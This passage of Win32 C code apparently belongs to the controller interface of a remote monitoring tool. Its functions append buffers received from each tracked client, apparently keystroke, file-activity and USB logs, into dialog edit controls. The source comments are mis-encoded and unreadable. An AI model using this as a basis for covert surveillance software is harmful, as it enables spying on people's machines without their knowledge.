			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT1), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
			break;
		}
		pClient = pClient->Next;
	}


	return 0;
}


//��ʾ�ļ������Ϣ
BOOL _stdcall _ShowFileControl(HWND hWnd)
{
	char szBuffer[256] = "\r\n";
	ClientData* pClient = pHandClient;		//����ָ��
	while (pClient != NULL)
	{
		if (pClient->hKeyWindow == hWnd)
		{
			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_SETSEL, -2, -1);					//���д�ļ��������
			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_REPLACESEL, true, (DWORD)szBuffer);

			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_SETSEL, -2, -1);					//���д�ļ��������
			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
			break;
		}
		pClient = pClient->Next;
	}
	return 0;
}



//��ʾUSB��Ϣ
BOOL _stdcall _ShowUSB(HWND hWnd)
{
	char szBuffer[256] = "\r\n";
	ClientData* pClient = pHandClient;		//����ָ��
	while (pClient != NULL)
	{
		if (pClient->hKeyWindow == hWnd)
		{
			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_SETSEL, -2, -1);					//���д�ļ��������
			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_REPLACESEL, true, (DWORD)szBuffer);

			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_SETSEL, -2, -1);					//���д�ļ��������
			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
			break;
		}
		pClient = pClient->Next;
	}
	return 0;
}